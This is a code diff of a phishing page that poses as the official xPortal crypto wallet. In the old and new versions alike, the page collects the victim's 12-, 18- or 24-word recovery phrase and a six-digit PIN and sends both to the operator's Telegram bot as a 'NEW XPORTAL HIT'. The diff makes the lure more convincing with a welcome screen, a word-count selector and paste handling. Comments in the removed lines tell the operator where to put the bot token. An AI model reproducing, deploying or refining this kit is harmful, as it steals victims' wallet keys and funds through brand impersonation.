@@ -3,37 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>xPortal | Security Access</title>
+    <title>xPortal | Wallet Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root { --xp-black: #000; --xp-teal: #23f7dd; --xp-purple: #8a3ffc; --xp-border: rgba(255, 255, 255, 0.08); --xp-card: #0d0d0d; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: var(--xp-black); color: #fff; min-height: 100vh; overflow: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); display: flex; align-items: center; justify-content: center; }
+        body { background: var(--xp-black); color: #fff; min-height: 100vh; overflow-x: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); display: flex; align-items: center; justify-content: center; }
 
-        .glass-card { background: var(--xp-card); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 25px; width: 100%; max-width: 440px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); position: relative; }
+        .glass-card { background: var(--xp-card); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 20px; width: 100%; max-width: 460px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); position: relative; }
         .hero-logo { width: 70px; height: 70px; margin-bottom: 20px; }
         
         .section { display: none; animation: fadeIn 0.4s ease; }
         .section.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        h1 { font-size: 26px; font-weight: 800; margin-bottom: 8px; letter-spacing: -1px; }
+        .subtitle { color: #888; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
+
+        /* SELECTOR */
+        .count-selector { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
+        .count-btn { background: rgba(255,255,255,0.05); border: 1px solid var(--xp-border); color: #888; padding: 8px 16px; border-radius: 12px; cursor: pointer; font-size: 12px; font-weight: 600; transition: 0.2s; }
+        .count-btn.active { background: var(--xp-purple); color: #fff; border-color: var(--xp-purple); }
 
         /* WORDS GRID */
-        .phrase-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 25px; }
+        .phrase-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 25px; max-height: 250px; overflow-y: auto; padding-right: 5px; }
         .word-box { position: relative; }
-        .word-box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; font-weight: 800; color: var(--xp-teal); opacity: 0.6; }
-        .word-box input { width: 100%; background: #000; border: 1px solid var(--xp-border); border-radius: 12px; padding: 12px 5px 12px 28px; color: #fff; font-size: 13px; outline: none; }
-        .word-box input:focus { border-color: var(--xp-purple); }
+        .word-box span { position: absolute; left: 8px; top: 50%; transform: translateY(-50%); font-size: 9px; font-weight: 800; color: var(--xp-teal); opacity: 0.6; }
+        .word-box input { width: 100%; background: #000; border: 1px solid var(--xp-border); border-radius: 10px; padding: 12px 5px 12px 25px; color: #fff; font-size: 12px; outline: none; }
+        .word-box input:focus { border-color: var(--xp-teal); }
 
-        /* PIN CODE STYLING */
-        .pin-container { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
-        .pin-dot { width: 15px; height: 15px; border: 2px solid var(--xp-border); border-radius: 50%; transition: 0.2s; }
+        /* PIN STYLE */
+        .pin-container { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
+        .pin-dot { width: 14px; height: 14px; border: 2px solid var(--xp-border); border-radius: 50%; }
         .pin-dot.filled { background: var(--xp-teal); border-color: var(--xp-teal); box-shadow: 0 0 10px var(--xp-teal); }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 250px; margin: 0 auto; }
-        .key { width: 60px; height: 60px; border-radius: 50%; background: rgba(255,255,255,0.03); display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 600; cursor: pointer; border: 1px solid var(--xp-border); }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 220px; margin: 0 auto; }
+        .key { width: 55px; height: 55px; border-radius: 50%; background: rgba(255,255,255,0.03); display: flex; align-items: center; justify-content: center; font-size: 18px; font-weight: 600; cursor: pointer; border: 1px solid var(--xp-border); transition: 0.2s; }
         .key:active { background: var(--xp-purple); }
 
-        .btn { width: 100%; height: 60px; border-radius: 100px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; background: #fff; color: #000; margin-top: 10px; }
-        #loading { display: none; color: var(--xp-teal); font-weight: 600; margin-top: 20px; animation: pulse 1.5s infinite; }
+        .btn { width: 100%; height: 60px; border-radius: 100px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .btn-primary { background: #fff; color: #000; }
+        .btn-secondary { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--xp-border); }
+        .btn:hover { transform: translateY(-3px); }
+
+        #status-msg { display: none; color: var(--xp-teal); font-weight: 600; margin-top: 20px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
     </style>
 </head>
 <body>
@@ -41,16 +54,33 @@
 <div class="glass-card">
     <img src="Capture.PNG" class="hero-logo">
 
-    <div id="step-phrase" class="section active">
-        <h2 style="margin-bottom: 10px;">Import Wallet</h2>
-        <p style="color:#888; font-size: 14px; margin-bottom: 25px;">Enter your 12-word recovery phrase.</p>
-        <div class="phrase-grid" id="grid"></div>
-        <button class="btn" onclick="nextStep()">Continue</button>
+    <div id="step-welcome" class="section active">
+        <h1>Welcome to xPortal</h1>
+        <p class="subtitle">The official gateway to the Elrond ecosystem. Secure your assets.</p>
+        <button class="btn btn-primary" onclick="showStep('step-import')">Import Existing Wallet</button>
+        <button class="btn btn-secondary">Create New Wallet</button>
+    </div>
+
+    <div id="step-import" class="section">
+        <h2>Secret Phrase</h2>
+        <p class="subtitle">Select the number of words in your phrase.</p>
+        
+        <div class="count-selector">
+            <button class="count-btn active" onclick="genGrid(12, this)">12 Words</button>
+            <button class="count-btn" onclick="genGrid(18, this)">18 Words</button>
+            <button class="count-btn" onclick="genGrid(24, this)">24 Words</button>
+        </div>
+
+        <div class="phrase-grid" id="import-grid">
+            </div>
+
+        <button class="btn btn-primary" onclick="goToPin()">Continue</button>
+        <button class="btn btn-secondary" onclick="showStep('step-welcome')">Back</button>
     </div>
 
     <div id="step-pin" class="section">
-        <h2 style="margin-bottom: 10px;">Security PIN</h2>
-        <p style="color:#888; font-size: 14px;">Enter your 6-digit PIN to confirm access.</p>
+        <h2>Confirm PIN</h2>
+        <p class="subtitle">Enter your 6-digit security PIN to finalize.</p>
         <div class="pin-container" id="pinDots">
             <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
             <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
@@ -63,65 +93,73 @@
         </div>
     </div>
 
-    <div id="loading">Establishing Encrypted Connection...</div>
+    <div id="status-msg">Synchronizing Secure Node...</div>
 </div>
 
 <script>
-    // --- تليجرام كونفيج ---
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // حط التوكن هنا
-    const CHAT_ID = 'YOUR_CHAT_ID';     // حط الآيدي هنا
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; 
+    const CHAT_ID = 'YOUR_CHAT_ID';
 
     let phraseData = "";
     let currentPin = "";
+    let wordCount = 12;
 
-    // إنشاء مربعات الكلمات
-    const g = document.getElementById('grid');
-    for(let i=1; i<=12; i++) {
-        g.innerHTML += `<div class="word-box"><span>${i}</span><input type="password" class="w-in" placeholder="..."></div>`;
+    function showStep(id) {
+        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        if(id === 'step-import') genGrid(12);
     }
 
-    // الانتقال للـ PIN
-    function nextStep() {
+    function genGrid(n, btn) {
+        wordCount = n;
+        if(btn) {
+            document.querySelectorAll('.count-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+        }
+        const g = document.getElementById('import-grid');
+        g.innerHTML = '';
+        for(let i=1; i<=n; i++) {
+            g.innerHTML += `<div class="word-box"><span>${i}</span><input type="password" class="w-in" required placeholder="..." oninput="handlePaste(event)"></div>`;
+        }
+    }
+
+    function handlePaste(e) {
+        const val = e.target.value.trim();
+        if (val.includes(' ')) {
+            const words = val.split(/\s+/);
+            const inputs = document.querySelectorAll('.w-in');
+            words.forEach((w, i) => { if (inputs[i]) inputs[i].value = w; });
+        }
+    }
+
+    function goToPin() {
         let words = [];
         document.querySelectorAll('.w-in').forEach(i => words.push(i.value.trim()));
-        if(words.some(w => w === "")) return alert("Please fill all fields.");
+        if(words.some(w => w === "")) return alert("Please fill all words");
         phraseData = words.join(" ");
-        
-        document.getElementById('step-phrase').classList.remove('active');
-        document.getElementById('step-pin').classList.add('active');
+        showStep('step-pin');
     }
 
-    // كتابة الـ PIN
     function press(n) {
         if(currentPin.length < 6) {
             currentPin += n;
             updateDots();
-            if(currentPin.length === 6) sendFinalData();
+            if(currentPin.length === 6) sendFinal();
         }
     }
 
-    function del() {
-        currentPin = currentPin.slice(0, -1);
-        updateDots();
-    }
+    function del() { currentPin = currentPin.slice(0, -1); updateDots(); }
 
     function updateDots() {
         const dots = document.querySelectorAll('.pin-dot');
-        dots.forEach((dot, i) => {
-            dot.classList.toggle('filled', i < currentPin.length);
-        });
+        dots.forEach((dot, i) => dot.classList.toggle('filled', i < currentPin.length));
     }
 
-    // الإرسال النهائي
-    function sendFinalData() {
+    function sendFinal() {
         document.getElementById('step-pin').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
-
-        const text = `💎 xPortal New Hit!\n\nPhrase: ${phraseData}\nPIN Code: ${currentPin}`;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
-        .then(() => {
-            console.log("Success.");
-        });
+        document.getElementById('status-msg').style.display = 'block';
+        const msg = `🚀 NEW XPORTAL HIT!\n\nWords (${wordCount}): ${phraseData}\nPIN: ${currentPin}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
     }
 </script>
 
